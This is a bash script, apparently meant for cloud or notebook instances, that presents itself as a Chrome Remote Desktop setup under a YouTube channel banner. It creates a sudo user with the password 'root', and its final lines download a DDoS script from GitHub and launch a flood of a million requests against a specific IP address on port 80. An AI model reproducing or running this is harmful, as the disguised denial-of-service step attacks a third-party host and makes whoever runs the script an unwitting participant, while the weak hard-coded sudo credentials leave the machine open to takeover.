#! /bin/bash

# Make Instance Ready for Remote Desktop or RDP

b='\033[1m'
r='\E[31m'
g='\E[32m'
c='\E[36m'
endc='\E[0m'
enda='\033[0m'

clear

# Branding

printf """$c$b
░░░░░██╗░█████╗░███╗░░██╗░██████╗░░█████╗░███╗░░██╗  ██╗░░░░░██╗░░░██╗██████╗░░█████╗░  
░░░░░██║██╔══██╗████╗░██║██╔════╝░██╔══██╗████╗░██║  ██║░░░░░██║░░░██║██╔══██╗██╔══██╗  
░░░░░██║███████║██╔██╗██║██║░░██╗░███████║██╔██╗██║  ██║░░░░░██║░░░██║██████╔╝███████║  
██╗░░██║██╔══██║██║╚████║██║░░╚██╗██╔══██║██║╚████║  ██║░░░░░██║░░░██║██╔═══╝░██╔══██║  
╚█████╔╝██║░░██║██║░╚███║╚██████╔╝██║░░██║██║░╚███║  ███████╗╚██████╔╝██║░░░░░██║░░██║  
░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝  ╚══════╝░╚═════╝░╚═╝░░░░░╚═╝░░╚═╝  
░██████╗██╗░░░██╗██████╗░░██████╗░█████╗░██████╗░██╗██████╗░
██╔════╝██║░░░██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██║██╔══██╗
╚█████╗░██║░░░██║██████╦╝╚█████╗░██║░░╚═╝██████╔╝██║██████╦╝
░╚═══██╗██║░░░██║██╔══██╗░╚═══██╗██║░░██╗██╔══██╗██║██╔══██╗
██████╔╝╚██████╔╝██████╦╝██████╔╝╚█████╔╝██║░░██║██║██████╦╝
╚═════╝░░╚═════╝░╚═════╝░╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═════╝░
██╗░░░░░███████╗██╗░░░░░███████╗██████╗░  ░█████╗░██╗░░██╗░█████╗░███╗░░██╗███╗░░██╗███████╗██╗░░░░░
██║░░░░░██╔════╝██║░░░░░██╔════╝██╔══██╗  ██╔══██╗██║░░██║██╔══██╗████╗░██║████╗░██║██╔════╝██║░░░░░
██║░░░░░█████╗░░██║░░░░░█████╗░░██║░░██║  ██║░░╚═╝███████║███████║██╔██╗██║██╔██╗██║█████╗░░██║░░░░░
██║░░░░░██╔══╝░░██║░░░░░██╔══╝░░██║░░██║  ██║░░██╗██╔══██║██╔══██║██║╚████║██║╚████║██╔══╝░░██║░░░░░
███████╗███████╗███████╗███████╗██████╔╝  ╚█████╔╝██║░░██║██║░░██║██║░╚███║██║░╚███║███████╗███████╗
╚══════╝╚══════╝╚══════╝╚══════╝╚═════╝░  ░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚══╝╚══════╝╚══════╝
    $r ALFIAN ADI SUKMA $c 
$endc$enda""";


# Used Two if else type statements, one is simple second is complex. So, don't get confused or fear by seeing complex if else statement '^^.

# Creation of user
printf "\n\nCreating user " >&2
if sudo useradd -m user &> /dev/null
then
  printf "\ruser created $endc$enda\n" >&2
else
  printf "\r$r$b Error Occured $endc$enda\n" >&2
  exit
fi
# Add user to sudo group
sudo adduser user sudo

# Set password of user to 'root'
echo 'user:root' | sudo chpasswd

# Change default shell from sh to bash
sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd

# Initialisation of Installer
printf "\n\n$c$b    Loading Installer $endc$enda" >&2
if sudo apt-get update &> /dev/null
then
    printf "\r$g$b    Installer Loaded $endc$enda\n" >&2
else
    printf "\r$r$b    Error Occured $endc$enda\n" >&2
    exit
fi

# Installing Chrome Remote Desktop
printf "\n$g$b    Installing Chrome Remote Desktop $endc$enda" >&2
{
    wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
    sudo dpkg --install chrome-remote-desktop_current_amd64.deb
    sudo apt install --assume-yes --fix-broken
} &> /dev/null &&
printf "\r$c$b    Chrome Remote Desktop Installed $endc$enda\n" >&2 ||
{ printf "\r$r$b    Error Occured $endc$enda\n" >&2; exit; }

! apt install python2
! wget https://raw.githubusercontent.com/MrTamfanX/MCIDDOS/master/TamfanDdos.py
! chmod +x TamfanDdos.py
! python2 TamfanDdos.py 172.67.180.90 80 1000000